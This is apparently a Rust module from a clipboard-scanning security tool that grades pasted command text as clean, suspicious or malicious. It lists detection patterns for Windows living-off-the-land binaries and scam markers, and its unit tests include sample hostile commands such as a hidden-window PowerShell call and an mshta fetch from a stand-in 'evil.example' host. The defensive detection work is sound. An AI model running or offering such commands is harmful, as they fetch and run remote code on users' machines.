//! Verdict for command text (legacy `CommandDetector.Analyze`,
//! docs/spec/detection-rules.md §3.0–3.2).
//!
//! Execution signal only → Suspicious (official installers look like this too);
//! execution signal + any strong scam signal → Malicious. Download-and-execute is
//! itself an execution signal, and a strong one unless every source host is an
//! official installer host (#20).

use crate::{Level, Message, Verdict};

use super::re::Signal;
use super::{download_exec, normalize, signals};

/// Texts up to this many chars are analyzed as one piece (signals may sit on
/// different lines). Longer texts are analyzed in segments of this length: the
/// first window (covers the first line and Win+R's 259-char limit) plus every
/// later line.
pub const WINDOW_LENGTH: usize = 4096;
/// Lines longer than a window are cut into windows that advance by this much, so a
/// command of up to this many chars is always wholly inside some window.
pub const WINDOW_STEP: usize = WINDOW_LENGTH / 2;
/// Total chars analyzed in segment mode (beyond that nothing is analyzed), so huge
/// clipboards cannot stall the UI.
pub const MAX_SCANNED_CHARS: usize = 256 * 1024;
/// Non-blank lines analyzed in segment mode.
pub const MAX_LINES: usize = 4000;
/// Long texts keep at most this many consecutive whitespace chars per line (must
/// stay above the "30 spaces then #" threshold).
pub const MAX_WHITESPACE_RUN: usize = 64;

const REASON_DOWNLOAD_EXEC: &str = "cmd-reason-download-exec";
const REASON_UNOFFICIAL_SOURCE: &str = "cmd-reason-unofficial-source";
/// Weak scam signals: official installers also download and iex.
const WEAK: [&str; 2] = ["cmd-reason-download", "cmd-reason-iex"];

const EXECUTION_SIGNALS: [Signal; 22] = [
    (signals::powershell, "cmd-reason-powershell"),
    (signals::mshta_invocation, "cmd-reason-mshta"),
    (signals::cmd, "cmd-reason-cmd"),
    (signals::delayed_expansion, "cmd-reason-delayed-expansion"),
    (signals::certutil, "cmd-reason-certutil"),
    (signals::bitsadmin, "cmd-reason-bitsadmin"),
    (signals::rundll32, "cmd-reason-rundll32"),
    (signals::regsvr32, "cmd-reason-regsvr32"),
    (signals::msiexec, "cmd-reason-msiexec"),
    (signals::conhost, "cmd-reason-conhost"),
    (signals::curl_shell, "cmd-reason-curl-shell"),
    (signals::script_host, "cmd-reason-script-host"),
    (signals::html_help, "cmd-reason-html-help"),
    (signals::cmstp, "cmd-reason-cmstp"),
    (signals::pcalua, "cmd-reason-pcalua"),
    (signals::odbcconf, "cmd-reason-odbcconf"),
    (signals::install_util, "cmd-reason-installutil"),
    (signals::ftp_script, "cmd-reason-ftp-script"),
    (signals::remote_file, "cmd-reason-remote-file"),
    (signals::webdav, "cmd-reason-webdav"),
    (signals::search_ms, "cmd-reason-search-ms"),
    (signals::ms_msdt, "cmd-reason-ms-msdt"),
];

const SCAM_SIGNALS: [Signal; 8] = [
    (signals::hidden_window, "cmd-reason-hidden-window"),
    (signals::encoded, "cmd-reason-encoded"),
    (signals::iex, "cmd-reason-iex"),
    (signals::download, "cmd-reason-download"),
    (signals::bait_comment, "cmd-reason-bait-comment"),
    (signals::check_mark, "cmd-reason-check-mark"),
    (signals::padding, "cmd-reason-padding"),
    (signals::mshta_remote, "cmd-reason-mshta-remote"),
];

/// Analyzes clipboard text (legacy `CommandDetector.Analyze`).
pub fn analyze(text: &str) -> Verdict {
    if text.trim().is_empty() {
        return Verdict::CLEAN;
    }
    if fits_window(text) {
        return analyze_segment(text);
    }
    // Padding is mostly whitespace: shorten long runs first so spaces cannot push
    // a command out of the analyzed range (#19).
    let text = collapse_long_whitespace(text);
    if fits_window(&text) {
        return analyze_segment(&text);
    }
    let mut level = Level::None;
    let mut reasons: Vec<Message> = Vec::new();
    for segment in segments(&text) {
        let v = analyze_segment(segment);
        if v.level == Level::None {
            continue;
        }
        level = level.max(v.level);
        for r in v.reasons {
            if !reasons.contains(&r) {
                reasons.push(r);
            }
        }
    }
    if level == Level::None {
        Verdict::CLEAN
    } else {
        Verdict { level, reasons }
    }
}

fn fits_window(text: &str) -> bool {
    text.chars().nth(WINDOW_LENGTH).is_none()
}

/// Shortens every run of more than [`MAX_WHITESPACE_RUN`] whitespace chars within
/// a line to exactly that many spaces (every non-newline whitespace becomes a
/// space); newlines are kept. One pass, O(n).
pub(crate) fn collapse_long_whitespace(text: &str) -> String {
    let mut out = String::with_capacity(text.len().min(1 << 20));
    let mut run = 0usize;
    for c in text.chars() {
        if c != '\r' && c != '\n' && c.is_whitespace() {
            run += 1;
            if run <= MAX_WHITESPACE_RUN {
                out.push(' ');
            }
            continue;
        }
        run = 0;
        out.push(c);
    }
    out
}

/// Byte offset `n` chars after the start of `s` (or `s.len()`).
fn advance(s: &str, n: usize) -> usize {
    s.char_indices().nth(n).map_or(s.len(), |(i, _)| i)
}

/// Segments of a long text: the first window, then every line not wholly inside
/// it. Lines longer than a window become overlapping windows advancing by
/// [`WINDOW_STEP`]. Bounded by [`MAX_SCANNED_CHARS`] and [`MAX_LINES`].
pub(crate) fn segments(text: &str) -> Vec<&str> {
    let mut out = vec![&text[..advance(text, WINDOW_LENGTH)]];
    let mut scanned = WINDOW_LENGTH;
    let mut lines = 0usize;
    let mut start_b = 0usize;
    let mut start_c = 0usize;
    while start_b < text.len() && scanned < MAX_SCANNED_CHARS && lines < MAX_LINES {
        let rest = &text[start_b..];
        let end_b = rest.find('\n').map_or(text.len(), |i| start_b + i);
        let line = &text[start_b..end_b];
        let end_c = start_c + line.chars().count();
        if end_c > WINDOW_LENGTH && !line.trim().is_empty() {
            lines += 1;
            let mut chunk_b = start_b;
            let mut chunk_c = start_c;
            while chunk_c < end_c && scanned < MAX_SCANNED_CHARS {
                let length = (end_c - chunk_c).min(WINDOW_LENGTH);
                let chunk = &text[chunk_b..end_b];
                if chunk_c + length > WINDOW_LENGTH {
                    scanned += length;
                    out.push(&chunk[..advance(chunk, length)]);
                }
                if chunk_c + length >= end_c {
                    break;
                }
                chunk_b += advance(chunk, WINDOW_STEP);
                chunk_c += WINDOW_STEP;
            }
        }
        start_b = end_b + 1;
        start_c = end_c + 1;
    }
    out
}

fn matches(rules: &[Signal], text: &str) -> Vec<Message> {
    rules
        .iter()
        .filter(|(re, _)| re().is_match(text))
        .map(|(_, id)| Message::new(id))
        .collect()
}

fn analyze_segment(raw: &str) -> Verdict {
    let text = normalize(raw);

    let mut execution = matches(&EXECUTION_SIGNALS, &text);
    if signals::net_use_then_run(&text) {
        execution.push(Message::new("cmd-reason-net-use"));
    }
    // Download-and-execute is an execution signal by itself: `irm get.scoop.sh | iex`
    // names no program but runs when pasted into PowerShell.
    let download_exec = download_exec::is_match(&text);
    if download_exec {
        execution.push(Message::new(REASON_DOWNLOAD_EXEC));
    }
    if execution.is_empty() {
        return Verdict::CLEAN;
    }

    let mut scam = matches(&SCAM_SIGNALS, &text);
    if download_exec && !download_exec::is_from_official_source(&text) {
        scam.push(Message::new(REASON_UNOFFICIAL_SOURCE));
    }
    let strong = scam.iter().any(|m| !WEAK.contains(&m.id.as_ref()));
    let level = if strong {
        Level::Malicious
    } else {
        Level::Suspicious
    };
    execution.extend(scam);
    Verdict {
        level,
        reasons: execution,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn collapse_keeps_newlines_and_short_runs() {
        let input = format!("a{}#\n{}b", " ".repeat(5000), " ".repeat(10));
        let expected = format!("a{}#\n{}b", " ".repeat(64), " ".repeat(10));
        assert_eq!(collapse_long_whitespace(&input), expected);
    }

    #[test]
    fn segments_cover_long_lines_with_overlap() {
        let line = "a".repeat(10_000);
        let segs = segments(&line);
        // first window + windows starting at 2048, 4096, 6144 (the last reaches the end)
        assert_eq!(segs.len(), 4);
        assert!(segs.iter().all(|s| s.len() <= WINDOW_LENGTH));
    }

    #[test]
    fn segments_are_bounded() {
        let text = "x\n".repeat(1_000_000);
        let segs = segments(&text);
        assert!(segs.len() <= MAX_LINES + 1);
    }

    #[test]
    fn verdict_levels() {
        assert_eq!(analyze("").level, Level::None);
        assert_eq!(analyze("I use powershell every day").level, Level::None);
        assert_eq!(analyze("cmd /c dir").level, Level::Suspicious);
        let bad = ["power", "shell -w hidden -c calc"].concat();
        assert_eq!(analyze(&bad).level, Level::Malicious);
    }

    /// Legacy property "超大剪貼簿不會卡住" (CommandBypassTests and
    /// CommandDownloadLolbinTests): analyze + explain on each input < 3 s. The
    /// timing is only asserted in optimized builds.
    #[test]
    fn huge_clipboards_do_not_stall() {
        let inputs = [
            " ".repeat(2_000_000),
            "\n".repeat(2_000_000),
            "certutil ".repeat(200_000),
            "rundll32 # ".repeat(200_000),
            "a".repeat(2_000_000),
            format!("{}x\n", " ".repeat(4000)).repeat(500),
            r"net use z: \\a\b ".repeat(100_000),
            r"\\a\b\".repeat(300_000),
            r"start \\a\".repeat(200_000),
            "irm x | ".repeat(200_000),
            "iex $".repeat(200_000),
            "search-ms:".repeat(200_000),
            "wscript /a ".repeat(200_000),
            // Non-ASCII text keeps the lazy DFA from handling Unicode word boundaries.
            "中".repeat(1_000_000),
            "認証 # rob\u{e9} powershell iex ".repeat(100_000),
        ];
        for input in &inputs {
            let start = std::time::Instant::now();
            let _ = analyze(input);
            let _ = super::super::explain(input);
            let elapsed = start.elapsed();
            if !cfg!(debug_assertions) {
                assert!(
                    elapsed.as_millis() < 3000,
                    "{:?}… took {elapsed:?}",
                    input.chars().take(20).collect::<String>()
                );
            }
        }
    }

    #[test]
    fn command_after_long_padding_is_found() {
        let text = format!(
            "{}\n{}",
            "x".repeat(5000),
            ["ms", "hta https://evil.example/a"].concat()
        );
        assert_eq!(analyze(&text).level, Level::Malicious);
    }
}
